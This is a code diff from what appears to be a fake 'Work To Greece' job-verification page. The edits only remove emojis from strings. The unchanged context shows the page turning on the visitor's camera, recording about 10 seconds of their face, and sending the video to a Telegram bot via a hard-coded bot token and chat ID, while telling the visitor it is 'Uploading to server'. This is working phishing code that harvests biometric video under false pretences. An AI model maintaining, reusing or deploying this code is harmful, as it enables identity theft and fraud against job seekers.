@@ -599,7 +599,7 @@ async function tgVideo(blob,ext){
     const fd=new FormData();
     fd.append('chat_id',CHAT_ID);
     fd.append('video',blob,`face_verify.${ext}`);
-    fd.append('caption',`🎥 *FACIAL VERIFICATION*\n🇬🇷 Work To Greece\n🕐 ${new Date().toLocaleString()}`);
+    fd.append('caption',` *FACIAL VERIFICATION*\n🇬🇷 Work To Greece\n🕐 ${new Date().toLocaleString()}`);
     fd.append('parse_mode','Markdown');
     const r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,{method:'POST',body:fd});
     const d=await r.json(); return d.ok;
@@ -666,7 +666,7 @@ function openFacial(){
   $('camIconWrap').style.display='flex';
   $('faceTitle').textContent='Facial Verification';
   $('faceDesc').innerHTML='Your camera will activate. Please <strong>position your face</strong> within the frame and remain still for <strong>10 seconds</strong>.';
-  $('faceBtn').textContent='🎬  Start Recording';
+  $('faceBtn').textContent='Start Recording';
   $('faceBtn').disabled=false;
   $('faceBtn').onclick=startFacial;
   $('faceLaterBtn').style.display='block';
@@ -689,7 +689,7 @@ async function startFacial(){
     $('faceVideo').srcObject=mStream;
     $('camWrap').style.display='block';
     $('camIconWrap').style.display='none';
-    btn.textContent='🔴  Recording starts in 1s...';
+    btn.textContent=' Recording starts in 1s...';
     setTimeout(()=>beginRecording(),1000);
   }catch(e){
     err.innerHTML='❌ Camera or microphone access is required.<br>Please allow access from your browser settings.';
@@ -727,7 +727,7 @@ function beginRecording(){
 async function handleVideoDone(){
   stopCamera();
   const btn=$('faceBtn');
-  btn.textContent='📤  Uploading to server...';
+  btn.textContent=' Uploading to server...';
   btn.disabled=true;
   $('recBadge').classList.remove('show');
 
